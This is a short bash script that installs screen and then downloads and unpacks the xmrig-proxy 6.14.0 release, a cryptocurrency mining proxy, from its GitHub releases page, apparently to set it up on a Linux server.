#!/bin/bash
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz
tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz
cd xmrig-proxy-6.14.0
